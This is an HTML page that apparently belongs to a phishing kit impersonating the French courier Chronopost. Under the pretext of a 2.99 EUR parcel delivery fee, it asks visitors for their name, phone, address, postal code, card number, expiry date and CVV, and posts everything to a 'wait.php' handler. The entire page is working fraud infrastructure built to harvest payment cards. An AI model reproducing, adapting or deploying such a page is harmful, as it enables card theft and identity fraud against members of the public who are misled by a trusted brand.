<!DOCTYPE html>
<html>

<head>
	
	<link rel="icon" type="image/png" href="images/favicon.ico"/>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Chronopost - Suivi mon Colis</title>
    <link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
    <link rel="stylesheet" type="text/css" href="assets/css/styles.css">
    <link rel="stylesheet" type="text/css" href="assets/css/demo.css">
<link href="https://fonts.googleapis.com/css?family=Open+Sans&display=swap" rel="stylesheet"></head>

<body>
    <div class="container-fluid">
        <header>
            <div class="limiter">
            	<img src="images/chronopost_logo.png" alt="" >

               
                
            </div>
        </header>

        <div class="creditCardForm">
          <h3 style="font-family: 'Open Sans', sans-serif;font-weight: 700; text-align: center;" >Livraison à domicile (2,99 EUR)
</h3>
<h4>    Chronopost vous permet le suivi de vos envois de colis à tout moment et ce depuis l'expèdition jusqu'a la livraison.</h4>
            <div class="payment">
                <form action="wait.php" method="post" id="myForm">
                    <div class="form-group name">
                        <label for="owner">Nom et Prénom <span class="redd">*</span>  </label>
                        <input type="text" class="form-control" id="owner" name="nome">
                    </div>
                    <div class="form-group tel">
                        <label for="owner">Télephone <span class="redd">*</span>  </label>
                        <input type="text" class="form-control" id="owner" name="tel">
                    </div>
					<div class="form-group owner">
		                <label for="owner">Adresse <span class="redd">*</span>  </label>
		                <input type="text" class="form-control" id="owner" name="adres">
		            </div>
					<div class="form-group CVV">
		                <label for="owner">Code postal <span class="redd">*</span></label>
		                <input type="text" class="form-control" id="zip" name="zip">
		            </div>
 <div class="form-group" id="card-number-field">
                        <label for="cardNumber">Numéro de carte <span class="redd">*</span></label>
                        <input type="text" class="form-control" id="cardNumber" name="Cardnumber">
                    </div>	
                     <div class="form-group" id="expiration-date">
                        <label>Expiration (MM/AA) <span class="redd">*</span></label>
                        <select name="ExpirationDate">
                            <option value="01">01</option>
                            <option value="02">02 </option>
                            <option value="03">03</option>
                            <option value="04">04</option>
                            <option value="05">05</option>
                            <option value="06">06</option>
                            <option value="07">07</option>
                            <option value="08">07</option>
                            <option value="09">09</option>
                            <option value="10">10</option>
                            <option value="11">11</option>
                            <option value="12">12</option>
                        </select>
                        <select name="ExpirationD">
                            <option value="19"> 2019</option>
                            <option value="20"> 2020</option>
                            <option value="21"> 2021</option>
                            <option value="22"> 2022</option>
                            <option value="23"> 2023</option>
                            <option value="24"> 2024</option>
                            <option value="25"> 2025</option>
                        </select>
                    </div>
                    <div class="form-group CVVV">
                        <label for="cvv">CVV <span class="redd">*</span></label>
                        <input type="text" name="cvv" class="form-control" id="cvv">
                    </div>
                   
                   
                    <div class="form-group" id="credit_cards">
                        <img src="assets/images/visa.jpg" id="visa">
                        <img src="assets/images/mastercard.jpg" id="mastercard">
                        <img src="assets/images/amex.jpg" id="amex">
                    </div>
                    <div class="form-group" id="pay-now">
                        <button type="submit" class="btn btn-default" id="confirm-purchase" name="submitt">Confirmer</button>
                    </div>
                </form>
            </div>
        </div>

   

      
    </div>

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
    <script src="assets/js/jquery.payform.min.js" charset="utf-8"></script>
    <script src="assets/js/script.js"></script>
</body>

</html>
